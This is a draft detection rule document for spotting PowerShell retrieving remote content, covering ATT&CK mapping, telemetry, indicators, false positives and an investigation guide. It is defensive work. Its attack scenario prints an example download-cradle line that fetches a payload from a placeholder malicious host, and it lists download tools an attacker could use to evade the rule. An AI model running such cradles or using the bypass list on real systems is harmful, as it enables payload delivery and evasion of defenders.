# DET-002 - PowerShell Remote Content Retrieval

## Detection ID

DET-002

## Status

Draft

## Severity

Medium

## Version

1.0

## Author

m03n

---

# Threat Overview

PowerShell provides several legitimate methods for retrieving remote content over HTTP and HTTPS. System administrators commonly use these capabilities for software deployment, automation, and configuration management.

Attackers abuse the same functionality to retrieve second-stage payloads, download malicious scripts, establish command and control communications, or execute code directly in memory without writing files to disk.

Detecting PowerShell-based remote content retrieval provides defenders with an opportunity to identify malicious activity early in the attack lifecycle while correlating it with additional telemetry to improve confidence.

---

# MITRE ATT&CK Mapping

| Tactic | Technique |
|---------|-----------|
| Execution | T1059.001 – PowerShell |
| Command and Control | T1105 – Ingress Tool Transfer |

### Why this mapping?

The attacker is using PowerShell as the execution mechanism while retrieving additional attacker-controlled content from a remote location.

---

# Attack Scenario

An attacker gains initial access to a workstation through phishing or exploitation.

Instead of embedding an entire payload inside the initial command, the attacker downloads additional content using PowerShell.

Example:

(New-Object Net.WebClient).DownloadString("http://malicious-site/payload.ps1")

The downloaded content may be executed immediately in memory, reducing forensic artifacts and allowing attackers to stage larger payloads.

---

# Required Telemetry

| Source | Event |
|---------|-------|
| Sysmon | Event ID 1 |
| Windows Security | Event ID 4688 |
| PowerShell Operational Log | Event ID 4104 (if enabled) |

Important fields:

- Image
- CommandLine
- ParentImage
- User
- ProcessGuid

---

# Detection Logic

Generate an alert when a PowerShell process attempts to retrieve content from a remote source using commonly abused PowerShell download functionality.

Indicators include:

- DownloadString
- DownloadFile
- Invoke-WebRequest
- Invoke-RestMethod

The detection focuses on remote content retrieval behavior rather than a single PowerShell function.

---

# False Positives

Potential legitimate activity includes:

- Microsoft Intune
- SCCM
- Enterprise deployment tools
- Internal automation scripts
- Administrative PowerShell maintenance tasks

---

# Bypass Opportunities

An attacker may evade this detection by:

- Using curl.exe
- Using certutil.exe
- Using bitsadmin.exe
- Using mshta.exe
- Using System.Net.Http.HttpClient
- Using custom .NET networking classes
- Executing downloaded content through alternative interpreters

---

# Investigation Guide

If this detection triggers:

1. Review the complete PowerShell command line.
2. Identify the remote URL or IP address.
3. Determine whether the destination is trusted.
4. Review DNS queries and network connections.
5. Identify the parent process.
6. Determine whether additional child processes were created.
7. Review subsequent persistence or credential access activity.

---

# Future Improvements

Future enhancements include:

- Threat intelligence enrichment
- Parent process correlation
- Network telemetry correlation
- Automatic URL extraction
- Risk scoring
- Allow-list support
- Detection of additional PowerShell networking APIs